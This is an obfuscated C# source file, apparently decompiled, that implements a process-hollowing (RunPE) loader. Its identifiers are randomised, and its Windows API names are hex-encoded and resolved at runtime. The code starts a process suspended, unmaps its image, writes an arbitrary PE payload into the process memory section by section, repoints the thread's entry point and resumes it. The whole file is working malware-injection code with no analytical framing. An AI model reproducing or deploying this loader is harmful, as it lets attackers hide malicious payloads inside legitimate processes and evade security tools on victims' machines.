using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ZcVVdCANPCbBZjGTONrwNPFhxDuQUIJYETw;

public sealed class tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo : cBNTuwSqYfAGhOOhbRcmPJvbwXAXBaOmiWU
{
	private struct eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb
	{
		public uint ContextFlags;

		public uint Dr0;

		public uint Dr1;

		public uint Dr2;

		public uint Dr3;

		public uint Dr6;

		public uint Dr7;

		public FLOATING_SAVE_AREA FloatSave;

		public uint SegGs;

		public uint SegFs;

		public uint SegEs;

		public uint SegDs;

		public uint Edi;

		public uint Esi;

		public uint Ebx;

		public uint Edx;

		public uint Ecx;

		public uint Eax;

		public uint Ebp;

		public uint Eip;

		public uint SegCs;

		public uint EFlags;

		public uint Esp;

		public uint SegSs;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] ExtendedRegisters;
	}

	private delegate bool CreateProcessA(string lpApplicationName, string lpCommandLine, ref UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA MOGxkJabCpFFHVbxkXwxYBgYmnSMkxjQavHqYG, ref UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA dZSJlWHeBGOPuaTWLggLsmOmDGndKLgZegTYGnq, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref ggiePKxqNGJAxIpAlAUCdFZngHdJDJLxMojoeI gsAnGWSQEAdrwCDHrvrWJhFbmEtOfeMoZhQEWbV, out TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu);

	private struct FLOATING_SAVE_AREA
	{
		public uint ControlWord;

		public uint StatusWord;

		public uint TagWord;

		public uint ErrorOffset;

		public uint ErrorSelector;

		public uint DataOffset;

		public uint DataSelector;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] RegisterArea;

		public uint Cr0NpxState;
	}

	private delegate bool GetThreadContext(IntPtr hThread, ref eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh);

	private struct IMAGE_DATA_DIRECTORY
	{
		public uint VirtualAddress;

		public uint Size;
	}

	private struct mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl
	{
		public ushort e_magic;

		public ushort e_cblp;

		public ushort e_cp;

		public ushort e_crlc;

		public ushort e_cparhdr;

		public ushort e_minalloc;

		public ushort e_maxalloc;

		public ushort e_ss;

		public ushort e_sp;

		public ushort e_csum;

		public ushort e_ip;

		public ushort e_cs;

		public ushort e_lfarlc;

		public ushort e_ovno;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] e_res1;

		public ushort e_oemid;

		public ushort e_oeminfo;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] e_res2;

		public int e_lfanew;
	}

	private struct IMAGE_FILE_HEADER
	{
		public ushort Machine;

		public ushort NumberOfSections;

		public uint TimeDateStamp;

		public uint PointerToSymbolTable;

		public uint NumberOfSymbols;

		public ushort SizeOfOptionalHeader;

		public ushort Characteristics;
	}

	private struct dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq
	{
		public uint Signature;

		public IMAGE_FILE_HEADER FileHeader;

		public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
	}

	private struct IMAGE_OPTIONAL_HEADER32
	{
		public ushort Magic;

		public byte MajorLinkerVersion;

		public byte MinorLinkerVersion;

		public uint SizeOfCode;

		public uint SizeOfInitializedData;

		public uint SizeOfUninitializedData;

		public uint AddressOfEntryPoint;

		public uint BaseOfCode;

		public uint BaseOfData;

		public uint ImageBase;

		public uint SectionAlignment;

		public uint FileAlignment;

		public ushort MajorOperatingSystemVersion;

		public ushort MinorOperatingSystemVersion;

		public ushort MajorImageVersion;

		public ushort MinorImageVersion;

		public ushort MajorSubsystemVersion;

		public ushort MinorSubsystemVersion;

		public uint Win32VersionValue;

		public uint SizeOfImage;

		public uint SizeOfHeaders;

		public uint CheckSum;

		public ushort Subsystem;

		public ushort DllCharacteristics;

		public uint SizeOfStackReserve;

		public uint SizeOfStackCommit;

		public uint SizeOfHeapReserve;

		public uint SizeOfHeapCommit;

		public uint LoaderFlags;

		public uint NumberOfRvaAndSizes;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public IMAGE_DATA_DIRECTORY[] DataDirectory;
	}

	private struct OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU
	{
		public byte Name;

		public Misc Misc;

		public uint VirtualAddress;

		public uint SizeOfRawData;

		public uint PointerToRawData;

		public uint PointerToRelocations;

		public uint PointerToLinenumbers;

		public ushort NumberOfRelocations;

		public ushort NumberOfLinenumbers;

		public uint Characteristics;
	}

	private enum ImageSignatureTypes
	{
		IMAGE_DOS_SIGNATURE = 23117,
		IMAGE_NT_SIGNATURE = 17744,
		IMAGE_OS2_SIGNATURE = 17742,
		IMAGE_OS2_SIGNATURE_LE = 17740,
		IMAGE_VXD_SIGNATURE = 17740
	}

	private struct Misc
	{
		public uint PhysicalAddress;

		public uint VirtualSize;
	}

	private struct TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	private delegate int Re(IntPtr hProcess, int lpBaseAddress, ref IntPtr lpbuffer, int size, ref int gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS);

	private delegate uint ResumeThread(IntPtr hThread);

	private struct UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA
	{
		public int nLength;

		public IntPtr lpSecurityDescriptor;

		public int bInheritHandle;
	}

	private delegate bool SetThreadContext(IntPtr hThread, ref eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh);

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct ggiePKxqNGJAxIpAlAUCdFZngHdJDJLxMojoeI
	{
		public int cb;

		public string lpReserved;

		public string lpDesktop;

		public string lpTitle;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public int lpReserved2;

		public int hStdInput;

		public int hStdOutput;

		public int hStdError;
	}

	private delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	private delegate int VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, UIntPtr flNewProtect, [Out] uint lpflOldProtect);

	private delegate bool Wr(IntPtr hProcess, IntPtr lpBaseAddress, byte[] RfUsBItlIdhDqXAWCeXnnfHSYfUjNLDqZpB, int iSize, out int lpNumberOfBytesWritten);

	private delegate long ZwUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);

	private const int CONTEXT_X86 = 65536;

	private const int CONTEXT86_INTEGER = 65538;

	private const string KERNEL32HEX = "0x6b65726e656c3332";

	private const long MEM_COMMIT = 4096L;

	private const long MEM_RESERVE = 8192L;

	private const string NTDLLHEX = "0x6e74646c6c";

	private const long PAGE_EXECUTE = 16L;

	private const long PAGE_EXECUTE_READ = 32L;

	private const long PAGE_EXECUTE_READWRITE = 64L;

	private const long PAGE_NOACCESS = 1L;

	private const uint PAGE_READONLY = 2u;

	private const long PAGE_READWRITE = 4L;

	private long bedot(long characteristics)
	{
		object[] array = new object[8] { 1L, 16L, 2, 32L, 4L, 64L, 4L, 64L };
		return Conversions.ToLong(array[(int)RShift(characteristics, 29L)]);
	}

	public bool gOnTDqnkbWgEKWFhjKpnWFimHpGOQDIfqMhNP(byte[] brxEYWdvBgWOPcFNGlAZGjbvGQQoXUeYtIAerPn, string MxOmBDtislgHKYPqQCtIDnYfxwQHcWUmtuKESkr)
	{
		long num = 0L;
		uint num2 = 0u;
		IntPtr zero = IntPtr.Zero;
		mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl = default(mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl);
		eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh = default(eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb);
		dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq = default(dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq);
		OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU oYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU = default(OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU);
		TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu = default(TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE);
		ggiePKxqNGJAxIpAlAUCdFZngHdJDJLxMojoeI gsAnGWSQEAdrwCDHrvrWJhFbmEtOfeMoZhQEWbV = default(ggiePKxqNGJAxIpAlAUCdFZngHdJDJLxMojoeI);
		UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA MOGxkJabCpFFHVbxkXwxYBgYmnSMkxjQavHqYG = default(UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA);
		UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA dZSJlWHeBGOPuaTWLggLsmOmDGndKLgZegTYGnq = default(UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA);
		GCHandle gCHandle = GCHandle.Alloc(brxEYWdvBgWOPcFNGlAZGjbvGQQoXUeYtIAerPn, GCHandleType.Pinned);
		int num3 = gCHandle.AddrOfPinnedObject().ToInt32();
		mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl = (mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl)Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl.GetType());
		gCHandle.Free();
		CreateProcessA createProcessA = (CreateProcessA)WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x43726561746550726f6365737341", typeof(CreateProcessA));
		if (!createProcessA(null, MxOmBDtislgHKYPqQCtIDnYfxwQHcWUmtuKESkr, ref MOGxkJabCpFFHVbxkXwxYBgYmnSMkxjQavHqYG, ref dZSJlWHeBGOPuaTWLggLsmOmDGndKLgZegTYGnq, bInheritHandles: false, 4u, zero, null, ref gsAnGWSQEAdrwCDHrvrWJhFbmEtOfeMoZhQEWbV, out FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu))
		{
			return false;
		}
		int value = num3 + mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl.e_lfanew;
		IntPtr ptr = new IntPtr(value);
		dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq = (dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq)Marshal.PtrToStructure(ptr, dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq.GetType());
		gsAnGWSQEAdrwCDHrvrWJhFbmEtOfeMoZhQEWbV.cb = Strings.Len((object)gsAnGWSQEAdrwCDHrvrWJhFbmEtOfeMoZhQEWbV);
		MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh.ContextFlags = 65538u;
		if (((long)dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq.Signature != 17744L) | (mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl.e_magic != 23117))
		{
			return false;
		}
		GetThreadContext getThreadContext = (GetThreadContext)WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x476574546872656164436f6e74657874", typeof(GetThreadContext));
		Re re = (Re)WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x5265616450726f636573734d656d6f7279", typeof(Re));
		ZwUnmapViewOfSection zwUnmapViewOfSection = (ZwUnmapViewOfSection)WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6e74646c6c", "0x5a77556e6d6170566965774f6653656374696f6e", typeof(ZwUnmapViewOfSection));
		ptr = (IntPtr)num;
		int gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS = 0;
		num = (long)ptr;
		if (!(getThreadContext(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hThread, ref MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh) & (re(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (int)((long)MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh.Ebx + 8L), ref ptr, 4, ref gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS) >= 0) & (zwUnmapViewOfSection(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr)num) >= 0L)))
		{
			return false;
		}
		VirtualAllocEx virtualAllocEx = (VirtualAllocEx)WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x5669727475616c416c6c6f634578", typeof(VirtualAllocEx));
		uint num4 = (uint)(int)virtualAllocEx(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr)dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq.OptionalHeader.ImageBase, dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq.OptionalHeader.SizeOfImage, 12288u, 4u);
		if ((long)num4 == 0L)
		{
			return false;
		}
		Wr wr = (Wr)WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(Wr));
		gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS = (int)num2;
		wr(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr)num4, brxEYWdvBgWOPcFNGlAZGjbvGQQoXUeYtIAerPn, (int)dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq.OptionalHeader.SizeOfHeaders, out gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS);
		num2 = (uint)gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS;
		long num5 = mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl.e_lfanew + 248;
		int num6 = dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq.FileHeader.NumberOfSections - 1;
		for (int i = 0; i <= num6; i++)
		{
			ptr = new IntPtr(num3 + num5 + i * 40);
			oYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU = (OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU)Marshal.PtrToStructure(ptr, oYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU.GetType());
			byte[] array = new byte[oYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU.SizeOfRawData + 1];
			int num7 = (int)((long)oYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU.SizeOfRawData - 1L);
			for (int j = 0; j <= num7; j++)
			{
				array[j] = brxEYWdvBgWOPcFNGlAZGjbvGQQoXUeYtIAerPn[(int)oYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU.PointerToRawData + j];
			}
			wr = (Wr)WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(Wr));
			VirtualProtectEx virtualProtectEx = (VirtualProtectEx)WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x5669727475616c50726f746563744578", typeof(VirtualProtectEx));
			gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS = (int)num2;
			wr(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr)(num4 + oYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU.VirtualAddress), array, (int)oYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU.SizeOfRawData, out gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS);
			num2 = (uint)gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS;
			virtualProtectEx(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr)(num4 + oYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU.VirtualAddress), (UIntPtr)oYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU.Misc.VirtualSize, (UIntPtr)(ulong)bedot(oYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU.Characteristics), (uint)num);
		}
		byte[] bytes = BitConverter.GetBytes(num4);
		wr = (Wr)WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(Wr));
		gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS = (int)num2;
		wr(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr)((long)MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh.Ebx + 8L), bytes, 4, out gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS);
		num2 = (uint)gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS;
		MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh.Eax = num4 + dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq.OptionalHeader.AddressOfEntryPoint;
		SetThreadContext setThreadContext = (SetThreadContext)WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x536574546872656164436f6e74657874", typeof(SetThreadContext));
		ResumeThread resumeThread = (ResumeThread)WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x526573756d65546872656164", typeof(ResumeThread));
		if (!setThreadContext(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hThread, ref MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh))
		{
			return false;
		}
		return (long)resumeThread(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hThread) > 0L;
	}

	public bool gOnTDqnkbWgEKWFhjKpnWFimHpGOQDIfqMhNP(string mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl, string eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb)
	{
		bool result = false;
		if (File.Exists(mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl))
		{
			byte[] brxEYWdvBgWOPcFNGlAZGjbvGQQoXUeYtIAerPn = File.ReadAllBytes(mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl);
			return gOnTDqnkbWgEKWFhjKpnWFimHpGOQDIfqMhNP(brxEYWdvBgWOPcFNGlAZGjbvGQQoXUeYtIAerPn, eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb);
		}
		return result;
	}

	private long RShift(long dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq, long OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU)
	{
		return (long)Math.Round(vbLongToULong(dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq) / Math.Pow(2.0, OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU));
	}

	private double vbLongToULong(long TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE)
	{
		if (TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE < 0L)
		{
			return TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE + 4294967296L;
		}
		return TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE;
	}
}
